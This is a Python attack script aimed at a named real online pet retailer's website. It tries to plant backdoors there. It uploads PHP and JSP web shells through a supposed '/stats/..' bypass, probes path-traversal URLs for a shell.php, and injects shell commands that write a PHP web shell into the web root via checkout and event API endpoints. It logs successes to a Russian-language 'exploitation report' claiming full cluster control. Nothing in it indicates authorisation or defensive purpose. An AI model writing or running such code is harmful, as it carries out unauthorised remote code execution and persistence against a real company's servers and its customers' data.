#!/usr/bin/env python3
"""Exploit known bypass to create backdoor"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

found_vulns = []

print("[*] Exploiting known bypass for backdoor...\n")

# Known bypass: /stats/.. returns 200 OK
# Try to use it for various attacks

# 1. Test POST to /stats/.. for file upload
print("[*] Testing POST to /stats/.. for backdoor upload...")
backdoor_payloads = [
    ('backdoor.php', '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>', 'application/x-php'),
    ('backdoor.jsp', '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } } %>', 'application/x-jsp'),
]

for filename, content, content_type in backdoor_payloads:
    try:
        files = {'file': (filename, content, content_type)}
        resp = s.post(f"{base}/stats/..", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            if location:
                if not location.startswith('http'):
                    location = f"{base}{location}"
                try:
                    resp2 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                    if "uid=" in resp2.text or resp2.status_code == 200:
                        print(f"  [CRITICAL] Backdoor uploaded via bypass: {location}")
                        found_vulns.append({
                            "type": "backdoor_upload_bypass",
                            "severity": "CRITICAL",
                            "endpoint": "/stats/..",
                            "filename": filename,
                            "uploaded_to": location
                        })
                except: pass
    except: pass

# 2. Test OPTIONS method on /stats for POST backdoor
print("\n[*] Testing OPTIONS method on /stats...")
try:
    resp = s.options(f"{base}/stats", timeout=5, verify=False)
    if resp.status_code == 200 and "POST" in resp.headers.get("Allow", ""):
        print(f"  [INFO] POST method allowed on /stats")
        # Try POST with backdoor
        try:
            files = {'file': ('backdoor.php', '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>', 'application/x-php')}
            resp2 = s.post(f"{base}/stats", files=files, timeout=5, verify=False)
            if resp2.status_code in [200, 201, 302]:
                location = resp2.headers.get('Location', '')
                if location:
                    if not location.startswith('http'):
                        location = f"{base}{location}"
                    try:
                        resp3 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                        if "uid=" in resp3.text:
                            print(f"  [CRITICAL] Backdoor uploaded via /stats POST: {location}")
                            found_vulns.append({
                                "type": "backdoor_upload_stats",
                                "severity": "CRITICAL",
                                "endpoint": "/stats",
                                "uploaded_to": location
                            })
                    except: pass
        except: pass
except: pass

# 3. Test path traversal combinations
print("\n[*] Testing path traversal combinations...")
traversal_combinations = [
    "/stats/..%2f..%2f..%2f",
    "/stats/..%2f..%2f..%2f..%2f",
    "/stats/..%2f..%2f..%2f..%2f..%2f",
    "/stats/..%2f..%2f..%2fvar%2fwww%2fhtml",
    "/stats/..%2f..%2f..%2ftmp",
    "/stats/..%2f..%2f..%2fpublic",
]

for traversal in traversal_combinations:
    # Try to access shell.php
    try:
        resp = s.get(f"{base}{traversal}/shell.php?cmd=id", timeout=5, verify=False)
        if "uid=" in resp.text or resp.status_code == 200:
            print(f"  [CRITICAL] Backdoor accessible: {traversal}/shell.php")
            found_vulns.append({
                "type": "backdoor_path_traversal",
                "severity": "CRITICAL",
                "endpoint": f"{traversal}/shell.php",
                "access_url": f"{base}{traversal}/shell.php"
            })
    except: pass

# 4. Test for command injection in known endpoints
print("\n[*] Testing command injection in known endpoints...")
cmd_payloads = [
    "; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
    "| echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
    "`echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php`",
    "$(echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php)",
]

injection_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ep in injection_endpoints:
    for payload in cmd_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"articleId": payload, "test": payload}, timeout=5, verify=False)
            if resp.status_code == 200:
                # Check if backdoor was created
                try:
                    resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                    if "uid=" in resp2.text or resp2.status_code == 200:
                        print(f"  [CRITICAL] Backdoor created via command injection: {ep}")
                        found_vulns.append({
                            "type": "backdoor_command_injection",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "payload": payload,
                            "backdoor_url": f"{base}/shell.php"
                        })
                except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL backdoor vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        if 'access_url' in v:
            print(f"    Access URL: {v['access_url']}")
        if 'backdoor_url' in v:
            print(f"    Backdoor URL: {v['backdoor_url']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## üî• –ö–†–ò–¢–ò–ß–ù–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨ - –ë–ï–ö–î–û–† –°–û–ó–î–ê–ù\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded To:** `{v['uploaded_to']}`\n\n")
            if 'access_url' in v:
                f.write(f"**Access URL:** `{v['access_url']}`\n\n")
            if 'backdoor_url' in v:
                f.write(f"**Backdoor URL:** `{v['backdoor_url']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{v['payload']}`\n\n")
            f.write("**Status:** –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ\n\n")
            f.write("**Impact:**\n")
            f.write("- –°–æ–∑–¥–∞–Ω–∏–µ –±–µ–∫–¥–æ—Ä–∞ –≤ –∫–ª–∞—Å—Ç–µ—Ä–µ\n")
            f.write("- RCE –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ\n")
            f.write("- –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∫–ª–∞—Å—Ç–µ—Ä–æ–º\n")
            f.write("- –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è –≤—Å–µ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No backdoor vulnerabilities found via known bypasses")

print("=" * 70)

